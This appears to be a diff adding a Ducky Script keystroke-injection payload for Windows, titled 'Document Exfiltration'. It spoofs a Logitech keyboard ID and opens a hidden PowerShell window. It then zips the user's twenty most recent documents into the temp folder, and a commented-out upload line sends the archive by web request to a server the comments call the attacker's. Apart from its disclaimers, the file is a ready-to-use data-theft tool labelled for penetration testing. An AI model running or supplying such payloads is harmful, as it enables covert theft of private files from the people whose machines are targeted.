@@ -1,0 +1,26 @@
+REM Title: Document Exfiltration
+REM Author: Community
+REM Target: Windows 10/11
+REM Description: Zips and exfils user documents - AUTHORIZED TESTING ONLY
+REM EDIT LHOST BEFORE USE
+REM AUTHORIZED PENETRATION TESTING ONLY
+REM
+ID 046D:C31C Logitech USB Keyboard
+
+DELAY 1500
+
+GUI r
+DELAY 600
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+
+REM Zip recent documents and upload to attacker server
+REM CHANGE server IP/URL to yours
+STRING $docs = Get-ChildItem "$env:USERPROFILE\Documents" -Recurse -Include *.txt,*.docx,*.pdf,*.xlsx,*.csv -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 20; $zip = "$env:TEMP\docs.zip"; Compress-Archive -Path $docs.FullName -DestinationPath $zip -Force -ErrorAction SilentlyContinue; Write-Output "Zipped $(($docs | Measure-Object).Count) files to $zip"
+ENTER
+DELAY 3000
+
+REM Uncomment below to upload to your server
+REM STRING Invoke-WebRequest -Uri 'http://192.168.1.100:8080/upload' -Method POST -InFile $zip
+REM ENTER
